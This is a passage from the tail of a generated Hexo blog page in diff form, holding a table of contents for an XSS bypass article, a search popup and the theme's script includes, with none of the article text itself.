class="nav-text">HTML无法执行脚本的标签</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS%E5%B8%B8%E8%A7%81%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="nav-text">XSS常见绕过方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97%E8%A2%AB%E8%BF%87%E6%BB%A4"><span class="nav-text">关键字被过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC-%E5%BC%95%E5%8F%B7"><span class="nav-text">过滤空格&#x2F;引号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E5%8D%95-%E5%8F%8C%E5%BC%95%E5%8F%B7"><span class="nav-text">过滤单&#x2F;双引号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E6%8B%AC%E5%8F%B7"><span class="nav-text">过滤括号</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4URL%E5%9C%B0%E5%9D%80"><span class="nav-text">过滤URL地址</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS%E9%AB%98%E7%BA%A7%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="nav-text">XSS高级利用方式</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#JSONP%E5%8A%AB%E6%8C%81"><span class="nav-text">JSONP劫持</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DNSLog"><span class="nav-text">DNSLog</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87CSP"><span class="nav-text">绕过CSP</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="nav-text">参考资料</span></a></li></ol></li></ol>
+    </div>
+</div>
+        
+    </aside>
+
+    <!-- image viewer -->
+    <div class="image-viewer-container">
+    <div class="img-box">
+        <img src="">
+    </div>
+</div>
+
+
+</div>
+
+
+
+    <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-icon">
+            <i class="fas fa-search"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="popup-btn-close">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/dark-light-toggle.js"></script>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/local-search.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/left-side-toggle.js"></script>
+
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/code-copy.js"></script>
+    
+
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/libs/anime.min.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/js/toc.js"></script>
+    
+
+
+</body>
+</html>
